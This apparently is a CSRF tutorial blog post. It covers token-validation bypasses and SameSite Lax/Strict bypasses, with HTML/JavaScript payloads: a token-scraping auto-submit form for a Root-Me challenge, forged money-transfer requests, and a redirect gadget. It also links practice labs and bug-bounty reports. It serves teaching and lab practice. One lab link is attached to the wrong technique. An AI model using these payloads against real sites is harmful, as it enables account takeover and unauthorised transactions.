---
title: "CSRF Tutorial"
date: 2025-11-03
categories: [writeups, tutorials, CSRF]
tags: [CSRF, tutorials, web-security]
---
---


### 1. Change the request method

    the attacker can switch to the ***GET*** method to bypass the validation and deliver a CSRF attack

### 2. Delete the CSRF token

    Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
        
### 3. CSRF isn’t tied to the user session

    Some applications do not validate that the token belongs to the same session as the user who is making the request.

### **4. CSRF token is tied to a non-session cookie**

    CSRF token is tied to csrf key not tied to the user session
    so if the attacker can inject the csrf key in the victim cookies 
    the attacker then can use his csrf token

[Lab Link](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

### **5. CSRF token is simply duplicated in a cookie**

    we have token in cookie and one in the body 
    the app test if the token in cookie identical with the token in body

    if the attacker can inject any token in the victim's app then can do the csrf attack

[Lab Link](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

### 6. BY get the token from the victim (leaked token)

    <form name="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
        <input type="hidden" name="username" value="tester" />
        <input type="hidden" name="status" value="on" />
        <input id="admin-token" type="hidden" name="token" value="" />
    </form>

    <script>

        var request = new XMLHttpRequest();
        request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
        request.send(null);
        var response = request.responseText;
        var groups = response.match("token\" value=\"(.*?)\"");
        var token = groups[1];
        document.getElementById("admin-token").value = token;    
        document.csrf.submit();
    </script>

### **Bypassing SameSite Lax restrictions**

At first let’s understand if the SameSite=lax 

that means the browser only send the cookie 

- in GET request
- Top level navigation (the user clicks on link)

### **using GET requests**

    <script>
        document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
    </script>

    <form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
        <input type="hidden" name="_method" value="GET">
        <input type="hidden" name="recipient" value="hacker">
        <input type="hidden" name="amount" value="1000000">
    </form>

### **using on-site gadgets**

    // vulnerable redirect gadget
    let next = new URLSearchParams(window.location.search).get("next");
    if (next) {
        location.href = next;
    }

    https://victim.com/redirector.html?next=/transfer?amount=1000000&to=hacker

lab: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

### **via vulnerable sibling domains**

1. if `admin.example.com` contain a page to change the email
    
    `https://admin.example.com/account/change-email?email=hacker@evil.com` and the session secure with `SameSite=strict`
    
2. if a sibling domain (subdomain: `blog.example.com`) contain a xss the attacker can store the payload when the victim visit it the attack excutes

[lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

---

## Labs

### Rootme

1. [CSRF lab](https://www.root-me.org/fr/Challenges/Web-Client/CSRF-0-protection)
2. [CSRF lab](https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton)   ← like this report https://hackerone.com/reports/127703

---

## Reports

### Login

1. [report](https://hackerone.com/reports/834366)
2. [report](https://hackerone.com/reports/339352)

### Change password

1. [report](https://hackerone.com/reports/204703)
2. [report](https://hackerone.com/reports/2106662)

### Full account takeover

1. [report](https://hackerone.com/reports/127703)    ←  by linking a google account
2. [report](https://hackerone.com/reports/6910)
3. [report](https://hackerone.com/reports/2712857)   ← by update the account (email, …)
4. [report](https://hackerone.com/reports/1404612)   ← in tiktok

### GraphQL

1. [report](https://hackerone.com/reports/1122408)

## bypass the `same-site:`

1. [report](https://hackerone.com/reports/3253725)
